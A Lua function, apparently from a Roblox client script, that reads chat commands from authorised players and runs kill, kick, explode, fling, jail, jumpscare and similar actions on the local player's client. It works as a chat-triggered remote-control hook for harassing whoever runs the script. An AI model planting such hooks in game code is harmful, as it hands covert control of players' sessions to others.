local function ProcessarComandoChat(msg)
    local texto = msg.Text or ""
    local emissorName = msg.TextSource and msg.TextSource.Name
    if not emissorName or emissorName == LocalPlayer.Name then return end

    local emissor = Players:FindFirstChild(emissorName)
    if not emissor or not TemAcesso(emissor) then return end
    
    local cmd, alvo = texto:match("^;(%S+)%s+(.+)$")
    if not cmd or not alvo then 
        cmd = texto:match("^;(%S+)")
        alvo = ""
    end
    if not cmd then return end
    
    cmd = cmd:lower()
    alvo = alvo:lower()
    
    if alvo ~= LocalPlayer.Name:lower() and alvo ~= "all" and alvo ~= "" then return end
    
    local chave = texto .. tostring(os.time())
    if comandosProcessados[chave] then return end
    comandosProcessados[chave] = true
    task.wait(0.5)
    comandosProcessados[chave] = nil
    
    if cmd == "kill" then Action_Kill()
    elseif cmd == "killplus" then Action_KillPlus()
    elseif cmd == "kick" then Action_Kick()
    elseif cmd == "explode" then Action_Explode()
    elseif cmd == "fling" then Action_Fling()
    elseif cmd == "freeze" then FreezePlayer(LocalPlayer)
    elseif cmd == "unfreeze" then UnfreezePlayer(LocalPlayer)
    elseif cmd == "jail" then CreateAndManageJail(LocalPlayer)
    elseif cmd == "unjail" then RemoveJail(LocalPlayer)
    elseif cmd == "bring" then Action_Bring()
    elseif cmd == "backrooms" then BackroomsSystem()
    elseif cmd == "unbackrooms" then
        RestoreNormalWorld()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 10, 0)
        end
    elseif cmd == "jumps1" then runJumpscareLocally(86379969987314, 143942090)
    elseif cmd == "jumps2" then runJumpscareLocally(86379969987314, 143942090)
    elseif cmd == "jumps3" then runJumpscareLocally(127382022168206, 143942090)
    elseif cmd == "jumps4" then runJumpscareLocally(95973611964555, 138873214826309)
    elseif cmd == "bug" then
        Action_Bug(LocalPlayer)
    elseif cmd == "unbug" then
        Action_Unbug(LocalPlayer)
    end
end

